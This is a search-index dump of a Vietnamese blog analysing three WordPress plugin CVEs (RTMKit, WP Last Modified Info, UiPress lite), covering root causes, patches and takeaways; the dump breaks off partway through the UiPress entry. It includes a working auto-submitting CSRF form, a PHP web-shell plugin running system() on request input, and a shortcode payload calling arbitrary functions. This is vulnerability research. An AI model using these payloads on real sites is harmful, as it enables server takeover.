[{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Improper Control of Generation of Code (‚ÄòCode Injection‚Äô) trong Rometheme RomethemeKit For Elementor cho ph√©p x·∫£y ra Command Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn RomethemeKit For Elementor t·ª´ n/a ƒë·∫øn phi√™n b·∫£n 1.5.4. CVE ID: CVE-2025-30911 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.5.4 Patched Versions: 1.5.5 CVSS severity: High (9.9) Required Privilege: Subcriber Product: WordPress RTMKit Plugin ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - RTMKit: 1.5.3 ‚Äì vulnerable 1.5.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rGhi ch√∫ L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë x·∫£y ra ƒë·∫øn phi√™n b·∫£n 1.5.4 nh∆∞ng th·ª±c s·ª± n√≥ ƒë√£ ƒë∆∞·ª£c v√° m·ªôt ph·∫ßn trong phi√™n b·∫£n n√†y, n√™n t√¥i ch·ªçn phi√™n b·∫£n 1.5.3 ƒë·ªÉ ph√¢n t√≠ch Trong phi√™n b·∫£n l·ªói (v1.5.3): public function install_requirements() { include_once ABSPATH . 'wp-admin/includes/plugin.php'; include_once ABSPATH . 'wp-admin/includes/file.php'; include_once ABSPATH . 'wp-admin/includes/misc.php'; include_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php'; $plugin = $_POST['plugin']; $plugin_file = WP_PLUGIN_DIR . '/' . $plugin; $plugin_slug = dirname($plugin); if (file_exists($plugin_file)) { // Activate the plugin if already installed but inactive ob_start(); activate_plugin($plugin); ob_clean(); ob_end_clean(); wp_send_json_success(\"Install and Activate Successfully\"); } else { ob_start(); $plugin_download_url = \"https://downloads.wordpress.org/plugin/{$plugin_slug}.latest-stable.zip\"; // Adjust URL structure $upgrader = new \\Plugin_Upgrader(); $result = $upgrader-\u003einstall($plugin_download_url); if (is_wp_error($result)) { wp_send_json_error(); } $activate_result = activate_plugin($plugin); if (is_wp_error($activate_result)) { wp_send_json_error('Plugin installed but failed to activate: ' . $activate_result-\u003eget_error_message()); } wp_send_json_success('Plugin installed and activated successfully.'); } } H√†m install_requirements() cho ph√©p t·∫£i v√† k√≠ch ho·∫°t plugin d·ª±a tr√™n gi√° tr·ªã c·ªßa $_POST['plugin']: N·∫øu plugin ƒë√£ t·∫£i m√† ch∆∞a active th√¨ th·ª±c hi·ªán active: if (file_exists($plugin_file)) { // Activate the plugin if already installed but inactive ob_start(); activate_plugin($plugin); ob_clean(); ob_end_clean(); wp_send_json_success(\"Install and Activate Successfully\"); } N·∫øu plugin ch∆∞a t·∫£i th√¨ th·ª±c hi·ªán t·∫£i n√≥ v·ªÅ Tuy nhi√™n, h√†m n√†y kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng n√†o. Sang phi√™n b·∫£n v1.5.4, nh√† ph√°t tri·ªÉn ƒë√£ v√° m·ªôt ph·∫ßn b·∫±ng c√°ch th√™m ƒëo·∫°n: if (!current_user_can('manage_options')) { wp_die(); } manage_options l√† quy·ªÅn ch·ªâ d√†nh cho Administrator, v√¨ v·∫≠y gi·ªù ƒë√¢y ch·ªâ t√†i kho·∫£n Admin m·ªõi c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c ch·ª©c nƒÉng n√†y. Vi·ªác n√†y ƒë√£ ngƒÉn ƒë∆∞·ª£c user th√¥ng th∆∞·ªùng (Subscriber, Author, v.v.) v√† ng∆∞·ªùi kh√¥ng ƒëƒÉng nh·∫≠p tr·ª±c ti·∫øp khai th√°c l·ªó h·ªïng. Tuy nhi√™n, b·∫£n v√° n√†y v·∫´n ch∆∞a ƒë·ªß an to√†n. V√¨ sao? M·∫∑c d√π ƒë√£ gi·ªõi h·∫°n quy·ªÅn l√† Administrator, nh∆∞ng h√†m n√†y kh√¥ng c√≥ c∆° ch·∫ø ch·ªëng CSRF (Cross-Site Request Forgery). ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: N·∫øu Administrator ƒëang ƒëƒÉng nh·∫≠p v√†o website WordPress v√† truy c·∫≠p v√†o m·ªôt trang web ƒë·ªôc h·∫°i do attacker ki·ªÉm so√°t th√¨ trang ƒë√≥ c√≥ th·ªÉ b√≠ m·∫≠t g·ª≠i m·ªôt request (POST) t·ªõi install_requirements request n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán v·ªõi quy·ªÅn c·ªßa Administrator, v√¨ tr√¨nh duy·ªát ƒëang mang theo cookie ƒëƒÉng nh·∫≠p. ƒê·∫øn phi√™n b·∫£n v1.5.5, nh√† ph√°t tri·ªÉn m·ªõi th·ª±c s·ª± v√° ho√†n ch·ªânh l·ªó h·ªïng b·∫±ng c√°ch th√™m ki·ªÉm tra nonce: if (!isset($_POST['wpnonce']) || !wp_verify_nonce($_POST['wpnonce'], 'rtm_template_nonce')) { wp_send_json_error('Access Denied'); wp_die(); } Khi k·∫øt h·ª£p c·∫£ hai l·ªõp b·∫£o v·ªá: current_user_can('manage_options') ‚Üí ki·ªÉm tra quy·ªÅn wp_verify_nonce() ‚Üí ch·ªëng CSRF Th√¨ l·ªó h·ªïng m·ªõi ƒë∆∞·ª£c v√° ƒë√∫ng c√°ch. ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p (wp_ajax_): add_action('wp_ajax_install_requirements', [$this, 'install_requirements']); Khi truy c·∫≠p ƒë·∫øn endpoint /wp-admin/admin-ajax.php v·ªõi action=install_requirements th√¨ callback install_requirements ƒë∆∞·ª£c g·ªçi. ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Administrator is logged in to the WordPress site\"]\r--\u003e B[\"Administrator visits a malicious website controlled by the attacker\"]\rB --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"]\rC --\u003e D[\"Browser automatically includes Administrator cookies\"]\rD --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"]\rE --\u003e F[\"install_requirements() is executed without nonce validation\"]\rF --\u003e G[\"Untrusted $_POST['plugin'] is processed\"]\rG --\u003e H[\"Plugin_Upgrader-\u003einstall()\"]\rH --\u003e I[\"activate_plugin()\"]\rI --\u003e J[\"Malicious plugin is installed and activated\"]\rgraph TD\rA[\"Administrator is logged in to the WordPress site\"]\r--\u003e B[\"Administrator visits a malicious website controlled by the attacker\"]\rB --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"]\rC --\u003e D[\"Browser automatically includes Administrator cookies\"]\rD --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"]\rE --\u003e F[\"install_requirements() is executed without nonce validation\"]\rF --\u003e G[\"Untrusted $_POST['plugin'] is processed\"]\rG --\u003e H[\"Plugin_Upgrader-\u003einstall()\"]\rH --\u003e I[\"activate_plugin()\"]\rI --\u003e J[\"Malicious plugin is installed and activated\"]\rgraph TD\rA[\"Administrator is logged in to the WordPress site\"]\r--\u003e B[\"Administrator visits a malicious website controlled by the attacker\"]\rB --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"]\rC --\u003e D[\"Browser automatically includes Administrator cookies\"]\rD --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"]\rE --\u003e F[\"install_requirements() is executed without nonce validation\"]\rF --\u003e G[\"Untrusted $_POST['plugin'] is processed\"]\rG --\u003e H[\"Plugin_Upgrader-\u003einstall()\"]\rH --\u003e I[\"activate_plugin()\"]\rI --\u003e J[\"Malicious plugin is installed and activated\"]\rgraph TD\rA[\"Administrator is logged in to the WordPress site\"]\r--\u003e B[\"Administrator visits a malicious website controlled by the attacker\"]\rB --\u003e C[\"Malicious page sends a forged POST request to /wp-admin/admin-ajax.php?action=install_requirements\"]\rC --\u003e D[\"Browser automatically includes Administrator cookies\"]\rD --\u003e E[\"WordPress treats the request as coming from an authenticated Admin\"]\rE --\u003e F[\"install_requirements() is executed without nonce validation\"]\rF --\u003e G[\"Untrusted $_POST['plugin'] is processed\"]\rG --\u003e H[\"Plugin_Upgrader-\u003einstall()\"]\rH --\u003e I[\"activate_plugin()\"]\rI --\u003e J[\"Malicious plugin is installed and activated\"]\r","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o trang web ch·ª©a payload v√† g·ª≠i cho Administrator: \u003chtml\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin-ajax.php\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"action\" value=\"install\u0026#95;requirements\" /\u003e \u003cinput type=\"hidden\" name=\"plugin\" value=\"malicious\u0026#95;plugin\u0026#47;malicious\u0026#95;plugin\u0026#95;dir\u0026#46;php\" /\u003e \u003cinput type=\"submit\" value=\"Submit request\" /\u003e \u003c/form\u003e \u003cscript\u003e history.pushState('', '', '/'); document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Khi Administrator truy c·∫≠p l·∫ßn 2, plugin s·∫Ω ƒë∆∞·ª£c active V√≠ d·ª• plugin: if (!defined('ABSPATH')) { exit; } add_action('init', function () { if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); } }); Th·ª±c hi·ªán RCE K·∫øt qu·∫£\r","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong RTMKit \u003c= 1.5.4 n·∫±m ·ªü install_requirements(), khi h√†m n√†y x·ª≠ l√Ω tr·ª±c ti·∫øp gi√° tr·ªã $_POST['plugin'] ƒë·ªÉ c√†i ƒë·∫∑t v√† k√≠ch ho·∫°t plugin m√† thi·∫øu ki·ªÉm so√°t ƒë·∫ßy ƒë·ªß. Phi√™n b·∫£n 1.5.4 ƒë√£ th√™m ki·ªÉm tra quy·ªÅn v·ªõi current_user_can('manage_options') nh∆∞ng v·∫´n thi·∫øu b·∫£o v·ªá CSRF, cho ph√©p attacker l·ª£i d·ª•ng Administrator ƒëang ƒëƒÉng nh·∫≠p ƒë·ªÉ g·ª≠i request ng·∫ßm v√† c√†i plugin ƒë·ªôc h·∫°i. Ch·ªâ ƒë·∫øn v1.5.5, vi·ªác k·∫øt h·ª£p th√™m wp_verify_nonce() m·ªõi v√° k√≠n l·ªó h·ªïng v√† ch·∫∑n ƒë∆∞·ª£c nguy c∆° RCE. ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rLu√¥n ki·ªÉm tra quy·ªÅn v√† nonce cho m·ªçi AJAX endpoint. Kh√¥ng x·ª≠ l√Ω tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng v·ªõi c√°c h√†nh ƒë·ªông nh·∫°y c·∫£m nh∆∞ c√†i/k√≠ch ho·∫°t plugin. Ki·ªÉm tra quy·ªÅn th√¥i l√† ch∆∞a ƒë·ªß, ph·∫£i c√≥ ch·ªëng CSRF. ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress RTMKit Plugin \u003c= 1.5.4 is vulnerable to PHP Object Injection ","date":"2025-12-03","objectID":"/vi/posts/2025-12-03-cve-2025-30911/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/vi/posts/2025-12-03-cve-2025-30911/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Last Modified Info Plugin.","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Improper Control of Generation of Code (‚ÄòCode Injection‚Äô) trong plugin Sayan Datta WP Last Modified Info (wp-last-modified-info) cho ph√©p Remote Code Inclusion. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WP Last Modified Info t·ª´ n/a ƒë·∫øn \u003c= 1.9.2. CVE ID: CVE-2025-52756 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.9.4 Patched Versions: 1.9.5 CVSS severity: Medium (7.2) Required Privilege: Contributor Product: WordPress WP Last Modified Info Plugin ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Last Modified Info: 1.9.4 ‚Äì vulnerable 1.9.5 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v1.9.4): public function render( $atts ) { $post = get_post(); if ( ! $post instanceof \\WP_Post ) { return ''; } if ( ! $this-\u003eis_enabled( 'enable_last_modified_cb' ) ) { return ''; } $author_id = $this-\u003eget_meta( $post-\u003eID, '_edit_last' ); if ( $this-\u003eis_equal( 'show_author_cb', 'custom', 'default' ) ) { $author_id = $this-\u003eget_data( 'lmt_show_author_list' ); } $default_format = get_option( 'date_format' ); $atts = shortcode_atts( [ 'id' =\u003e $post-\u003eID, 'template' =\u003e $this-\u003eget_data( 'lmt_last_modified_info_template' ), 'date_format' =\u003e $this-\u003eget_data( 'lmt_date_time_format', $default_format ), 'date_type' =\u003e $this-\u003eget_data( 'lmt_last_modified_format_post', 'default' ), 'schema' =\u003e $this-\u003eget_data( 'lmt_enable_jsonld_markup_cb', 'disable' ), 'author_id' =\u003e (int) $author_id, 'hide_archive' =\u003e '', 'filter_ids' =\u003e '', 'gap' =\u003e (int) $this-\u003eget_data( 'lmt_gap_on_post', 0 ), ], $atts, 'lmt-post-modified-info' ); $_post = get_post( absint( $atts['id'] ) ); if ( ! $_post ) { return ''; } if ( $atts['hide_archive'] !== '' ) { foreach ( array_map( 'trim', explode( ',', $atts['hide_archive'] ) ) as $callback ) { if ( is_callable( $callback ) \u0026\u0026 $callback() ) { return ''; } } } ... } H√†m render() c·ªßa shortcode cho ph√©p nh·∫≠n thu·ªôc t√≠nh $atts['hide_archive'] t·ª´ ng∆∞·ªùi d√πng. Gi√° tr·ªã n√†y l√† m·ªôt chu·ªói ch·ª©a danh s√°ch c√°c t√™n h√†m, ƒë∆∞·ª£c ngƒÉn c√°ch b·ªüi d·∫•u ph·∫©y (,). V√≠ d·ª•: $atts['hide_archive'] = \"a,b,c\"; Khi ƒë√≥: explode(',', $atts['hide_archive']) ‚Üí ['a', 'b', 'c'] Sau khi t√°ch chu·ªói b·∫±ng explode(), ƒëo·∫°n code d√πng: array_map('trim', ...) ƒë·ªÉ xo√° kho·∫£ng tr·∫Øng th·ª´a ·ªü ƒë·∫ßu/ng∆∞·ªùi m·ªói ph·∫ßn t·ª≠, ƒë·∫£m b·∫£o t√™n h√†m ‚Äús·∫°ch‚Äù tr∆∞·ªõc khi x·ª≠ l√Ω. K·∫øt qu·∫£ v·∫´n l√† m·ªôt m·∫£ng c√°c chu·ªói, nh∆∞ng ƒë√£ ƒë∆∞·ª£c chu·∫©n ho√°: [\" a \", \" b \", \" c \"] ‚Üí [\"a\", \"b\", \"c\"] Ti·∫øp theo, v√≤ng l·∫∑p foreach duy·ªát t·ª´ng ph·∫ßn t·ª≠ v√† g√°n v√†o bi·∫øn $callback. T·∫°i ƒë√¢y, $callback ch√≠nh l√† t√™n m·ªôt h√†m d∆∞·ªõi d·∫°ng chu·ªói. foreach ( ... as $callback ) V·ªõi m·ªói $callback, code ki·ªÉm tra: is_callable( $callback ) ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: üëâ T√™n h√†m n√†y c√≥ t·ªìn t·∫°i v√† c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c hay kh√¥ng. N·∫øu ƒë√∫ng, ƒëo·∫°n code ti·∫øp t·ª•c g·ªçi tr·ª±c ti·∫øp h√†m ƒë√≥: $callback() Kh√¥ng c√≥ tham s·ªë n√†o ƒë∆∞·ª£c truy·ªÅn v√†o. N·∫øu h√†m ƒë∆∞·ª£c g·ªçi tr·∫£ v·ªÅ true th√¨ plugin s·∫Ω: return ''; v√† kh√¥ng hi·ªÉn th·ªã b·∫•t k·ª≥ n·ªôi dung n√†o c·ªßa shortcode. B·∫£n v√° (v1.9.5): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£ d√πng whitelist cho c√°c function =\u003e Tr√°nh g·ªçi h√†m tu·ª≥ √Ω. class Shortcode extends PostView { ... if ( in_array( $archive, $this-\u003efunctions, true ) \u0026\u0026 is_callable( $archive ) \u0026\u0026 $archive() ) { return $content; } ... } class PostView { protected $functions = [ 'is_archive', 'is_tax', 'is_home', 'is_front_page', 'is_search', 'is_404', 'is_author', 'is_category', 'is_tag', ]; ... } V√¨ class ShortCode k·∫ø th·ª´a PostView n√™n c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë∆∞·ª£c $functions c·ªßa l·ªõp cha. ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt shortcode b·∫±ng d√≤ng l·ªánh: add_shortcode( 'lmt-post-modified-info', [ $this, 'render' ] ); ƒêi·ªÅu n√†y c√≥ nghƒ©a l√†: khi WordPress g·∫∑p shortcode c√≥ tag lmt-post-modified-info trong n·ªôi dung b√†i vi·∫øt (ho·∫∑c khi b√†i vi·∫øt ƒë∆∞·ª£c hi·ªÉn th·ªã v√† c√≥ ch·ª©a shortcode n√†y), WordPress s·∫Ω g·ªçi ph∆∞∆°ng th·ª©c render() c·ªßa class hi·ªán t·∫°i ƒë·ªÉ x·ª≠ l√Ω v√† tr·∫£ v·ªÅ n·ªôi dung t∆∞∆°ng ·ª©ng. ƒê·ªÉ c√°c logic c·ªßa render ƒë∆∞·ª£c g·ªçi ta c·∫ßn ph·∫£i v∆∞·ª£t qua: if ( ! $this-\u003eis_enabled( 'enable_last_modified_cb' ) ) { return ''; } T·ª©c c·∫ßn ph·∫£i b·∫≠t option: Show Info on Frontend\r","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"]\r--\u003e B[\"WordPress loads the post content\"]\rB --\u003e C[\"Shortcode::render($atts) is executed\"]\rC --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"]\rD --\u003e E[\"For each $callback in list\"]\rE --\u003e F{\"is_callable($callback)?\"}\rF --\u003e|Yes| G[\"Invoke $callback()\"]\rgraph TD\rA[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"]\r--\u003e B[\"WordPress loads the post content\"]\rB --\u003e C[\"Shortcode::render($atts) is executed\"]\rC --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"]\rD --\u003e E[\"For each $callback in list\"]\rE --\u003e F{\"is_callable($callback)?\"}\rF --\u003e|Yes| G[\"Invoke $callback()\"]\rgraph TD\rA[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"]\r--\u003e B[\"WordPress loads the post content\"]\rB --\u003e C[\"Shortcode::render($atts) is executed\"]\rC --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"]\rD --\u003e E[\"For each $callback in list\"]\rE --\u003e F{\"is_callable($callback)?\"}\rF --\u003e|Yes| G[\"Invoke $callback()\"]\rgraph TD\rA[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"]\r--\u003e B[\"WordPress loads the post content\"]\rB --\u003e C[\"Shortcode::render($atts) is executed\"]\rC --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"]\rD --\u003e E[\"For each $callback in list\"]\rE --\u003e F{\"is_callable($callback)?\"}\rF --\u003e|Yes| G[\"Invoke $callback()\"]\r","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rD√πng t√†i kho·∫£n Administrator ƒë·ªÉ b·∫≠t option Show Info on Frontend ƒêƒÉng nh·∫≠p v·ªõi user Contributor T·∫°o post v·ªõi shortcode [lmt-post-modified-info hide_archive=phpinfo] Submit v√† preview: K·∫øt qu·∫£\r","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng trong WP Last Modified Info \u003c= 1.9.4 cho ph√©p Contributor ch√®n shortcode v·ªõi t√™n h√†m PHP tu·ª≥ √Ω trong hide_archive. C√°c h√†m n√†y ƒë∆∞·ª£c ki·ªÉm tra b·∫±ng is_callable() v√† g·ªçi tr·ª±c ti·∫øp, d·∫´n ƒë·∫øn Remote Code Execution. B·∫£n v√° 1.9.5 ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch gi·ªõi h·∫°n ch·ªâ g·ªçi c√°c h√†m an to√†n (whitelist). ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rKh√¥ng g·ªçi h√†m tr·ª±c ti·∫øp t·ª´ input ng∆∞·ªùi d√πng, k·ªÉ c·∫£ v·ªõi is_callable(). N·∫øu d√πng dynamic callback, lu√¥n d√πng whitelist. Shortcode l√† ƒëi·ªÉm t·∫•n c√¥ng ti·ªÅm ·∫©n; c·∫ßn ki·ªÉm so√°t input v√† quy·ªÅn ng∆∞·ªùi d√πng. ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress WP Last Modified Info Plugin \u003c= 1.9.4 is vulnerable to PHP Object Injection ","date":"2025-12-02","objectID":"/vi/posts/2025-12-02-cve-2025-52756/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/vi/posts/2025-12-02-cve-2025-52756/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress UiPress lite Plugin.","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rUiPress lite | plugin t·∫°o custom dashboards, admin themes v√† pages cho WordPress m·ªôt c√°ch d·ªÖ d√†ng t·ªìn t·∫°i l·ªó h·ªïng Remote Code Execution trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 3.5.07 th√¥ng qua h√†m uip_process_form_input(). Nguy√™n nh√¢n l√† do h√†m n√†y l·∫•y c√°c input do ng∆∞·ªùi d√πng cung c·∫•p ƒë·ªÉ th·ª±c thi c√°c h√†m t√πy √Ω v·ªõi d·ªØ li·ªáu t√πy √Ω, v√† kh√¥ng c√≥ b·∫•t k·ª≥ ki·ªÉm tra capability n√†o. ƒêi·ªÅu n√†y khi·∫øn c√°c attackers ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn truy c·∫≠p c·∫•p Subscriber tr·ªü l√™n, c√≥ th·ªÉ th·ª±c thi m√£ t√πy √Ω tr√™n m√°y ch·ªß. CVE ID: CVE-2025-3053 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 3.5.07 Patched Versions: 3.5.08 CVSS severity: High (8.8) Required Privilege: Subcriber Product: WordPress UiPress lite Plugin ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - UiPress lite: 3.5.07 ‚Äì vulnerable 3.5.08 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-12-01","objectID":"/vi/posts/2025-12-01-cve-2025-3053/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/vi/posts/2025-12-01-cve-2025-3053/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v3.5.07): public function uip_process_form_input() { // Check security nonce and 'DOING_AJAX' global Ajax::check_referer(); $data = json_decode(stripslashes($_POST[\"formData\"])); $data = Sanitize::clean_input_with_code($data); $userFunction = sanitize_text_field($_POST[\"userFunction\"]); if (!function_exists($userFunction)) { Ajax::error(__('Passed function doesn\\'t exist', \"uipress-lite\")); } // Try to start user supplied function try { $userFunction($data); } catch (Exception $e) { // Catch function error Ajax::error($e-\u003egetMessage()); } $returndata = []; $returndata[\"success\"] = true; wp_send_json($returndata); } H√†m uip_process_form_input() ƒë∆∞·ª£c g·ªçi th√¥ng qua AJAX v√† ch·ªâ d·ª±a v√†o Ajax::check_referer() ƒë·ªÉ ki·ªÉm tra nonce v√† x√°c nh·∫≠n y√™u c·∫ßu ƒëang ch·∫°y trong 